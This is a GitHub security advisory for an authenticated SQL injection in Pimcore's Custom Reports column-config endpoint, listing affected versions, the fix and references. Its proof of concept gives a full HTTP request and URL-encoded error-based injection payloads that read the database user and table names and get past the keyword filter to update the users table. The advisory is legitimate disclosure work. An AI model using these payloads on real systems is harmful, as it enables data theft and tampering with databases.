# [H] Pimcore Vulnerable to SQL Injection in Custom Reports Column Configuration

## Summary
Severity: High
Advisory: GHSA-3234-gxc3-pq6f
CVE: CVE-2026-44739
CWE: CWE-89
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-27
Source: https://github.com/advisories/GHSA-3234-gxc3-pq6f
Type: github-advisory

## Affected
- Packagist: `pimcore/pimcore` — affected >=2026.1.0 <2026.1.2
- Packagist: `pimcore/pimcore` — affected >=0 <11.5.17
- Packagist: `pimcore/pimcore` — affected >=12.0.0-RC1 <12.3.6

## Details
### Summary
The columnConfigAction endpoint in the CustomReportsBundle is vulnerable to SQL injection. An attacker with the reports_config permission can supply a malicious SQL configuration that is concatenated into a query and executed. Although the application attempts to filter certain DDL/DML keywords (like UPDATE, DELETE, DROP), it fails to prevent arbitrary SELECT queries, UNION statements, or the use of dangerous database functions. Furthermore, because the application returns database error messages in the JSON response, an attacker can easily exfiltrate data using error-based SQL injection techniques.
### Affected scope
bundles/CustomReportsBundle/src/Controller/Reports/CustomReportController.php
CustomReportController:columnConfigAction -> SqlAdapter::getColumns -> SqlAdapter::buildQueryString -> Db::fetchAssociative()


### PoC
* Download and install the version Pimcore <=12.3.3 (latest)
* Login using Admin account or any account that has reports_config permission
* Navigate to custom reports
* Capture the request using burp suite and perform SQLi attack as the following 
1. Get Database username
```
POST /admin/bundle/customreports/custom-report/column-config HTTP/1.1
Host: localhost
Content-Length: 310
sec-ch-ua-platform: "Linux"
Accept-Language: en-US,en;q=0.9
sec-ch-ua: "Not_A Brand";v="99", "Chromium";v="142"
sec-ch-ua-mobile: ?0
X-pimcore-extjs-version-minor: 0
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
X-pimcore-csrf-token: 2e42012c8310823bbdbce1598bdecfd19cb5e9c4
X-pimcore-extjs-version-major: 7
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/admin/
Accept-Encoding: gzip, deflate, br
Cookie: pimcore_admin_auth_profile_token=9f990b; PHPSESSID=d101f6fce4d87b8bdbbe800f9f50c82a; _pc_vis=3a17250fba52c657; _pc_ses=1774896807012; _pc_tss=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzQ4OTc1MTQuNjEwNzE3LCJwdGciOnsiX20iOjEsIl9jIjoxNzc0ODk2ODA1LCJfdSI6MTc3NDg5NzUxNCwidmk6c3J1IjpbN119LCJleHAiOjE3NzQ4OTkzMTR9.uO4iHiABylQ2KyZC0p8Li9hpgWfHnNQ01GUkbeY1Wmc; _pc_tvs=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NzQ4OTc1MTQuNjExNTA4LCJwdGciOnsiY21mOnNnIjp7Ijg2MCI6Mn0sIl9jIjoxNzc0ODc2MzQyLCJfdSI6MTc3NDg5NjgwNX0sImV4cCI6MTgwNjQzMzUxNH0.mhq_2qwWzWWGruI0VNnAwgs8QzfZfbc6Za0uGn7zNYM
Connection: keep-alive

configuration=%5b%7b%22type%22%3a%22sql%22%2c%22sql%22%3a%221%20AND%20(SELECT%201%20FROM%20(SELECT(EXTRACTVALUE(1%2cCONCAT(0x7e%2c(SELECT%20user())%2c0x7e))))x)%22%2c%22from%22%3a%22object_localized_CAR_en%22%2c%22where%22%3a%221%3d1%22%2c%22groupby%22%3a%22attributesAvailable%22%7d%5d&name=Quality_Attributes
```
2. Get Database name
```
configuration=%5b%7b%22type%22%3a%22sql%22%2c%22sql%22%3a%221%20AND%20(SELECT%201%20FROM%20(SELECT(EXTRACTVALUE(1%2cCONCAT(0x7e%2c(select%2bcurrent_setting(%24%24is_superuser%24%24))%2c0x7e))))x)%22%2c%22from%22%3a%22object_localized_CAR_en%22%2c%22where%22%3a%221%3d1%22%2c%22groupby%22%3a%22attributesAvailable%22%7d%5d&name=Quality_Attributes
```

3. Get Tables names
__Note__: Update the limit parameter to iterate around the tables queries like limit 0,1 limit 1,1 , limit 2,1 ..etc
```
configuration=%5b%7b%22type%22%3a%22sql%22%2c%22sql%22%3a%22(SELECT%201%20FROM%20(SELECT(EXTRACTVALUE(1%2cCONCAT(0x7e%2c(SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%3ddatabase()%20LIMIT%200%2c1)%2c0x7e))))x)%22%2c%22from%22%3a%22object_localized_CAR_en%22%2c%22where%22%3a%221%3d1%22%2c%22groupby%22%3a%22attributesAvailable%22%7d%5d&name=Quality_Attributes
```

4. Bypass the implemented Regex and perform SQL updat eto for exmaple update the admin username
```
configuration=%5b%7b%22type%22%3a%22sql%22%2c%22sql%22%3a%22*%22%2c%22from%22%3a%22users%22%2c%22where%22%3a%22id%3d1)%2f**%2fOR%2f**%2f1%3d1%3b%2f**%2fUPDATE%2f**%2fusers%2f**%2fSET%2f**%2fname%3d'admin'%2f**%2fWHERE%2f**%2fname%3d'admin2'%3b--%20-%22%2c%22groupby%22%3a%22attributesAvailable%22%7d%5d&name=Quality_Attributes
```
### Impact
By exploiting this vulneability any user with custom-report access could manipuate and crawl the database information and also bypass the application filters to Update,insert or delete database tables, which impact on the application confidentiality ,intergrity and service availability

## References
- https://github.com/pimcore/pimcore/security/advisories/GHSA-3234-gxc3-pq6f
- https://github.com/pimcore/pimcore/pull/19098
- https://github.com/pimcore/pimcore/commit/3fd7733464f464e58ffa49ed91550c1a3f9535f2
- https://github.com/pimcore/pimcore
- https://github.com/pimcore/pimcore/releases/tag/v12.3.6
